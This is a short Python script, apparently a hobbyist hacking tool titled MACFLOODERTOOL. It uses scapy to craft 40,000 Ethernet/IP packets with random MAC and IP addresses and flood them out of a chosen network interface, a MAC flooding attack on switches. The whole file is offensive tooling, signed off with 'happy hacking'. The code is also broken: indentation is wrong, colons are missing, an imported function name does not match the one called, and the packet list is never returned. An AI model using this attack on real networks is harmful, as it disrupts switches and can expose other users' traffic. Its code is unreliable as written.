
# this script is of same working as before one switchoverflow.py
# But this one is more specific and stick to the main functionality we want from the code

# used also some modules of scapy here for networking transactions 

import os 
import sys
from scapy.all import Ether , IP ,TCP ,RandIP , RandMAC , sendip  # imported only required functions for some required networking protocols from scapy module. 

  os.system("clear")   
	
	print "#############################"
	print "#        Python$tuff   #"
	print "#############################"
	print "# WELCOME To MACFLOODERTOOL #"
	print "#############################"
  print "Use the tool carefully"   # :) Just Warning as the script can make your system unresponsive.
    
  iface = raw_input("Please enter the name of active interface you want to flood") 
  
def  create_packet():
    packlist = []
    for i in xrange(1,40000)  # creating the 40000 fake ethernet data packets.
         packet = Ether(src = RandMAC() , dst = RandMAC())/IP(src=RandIP() , dst=RandIP())
         packlist.append(packet)
         

def attack_function(packlist)   # function to send the crafted packets to the network 
     
     sendp(packlist , iface)
     
     
if __name__ == '__main__':
    packlist = create_packet()
    attack_function(packlist) # called the main attack executing function 
    
# program ends
# happy hacking :))
# Use carefully ,, this may make your computer unresponsive for the while ;)
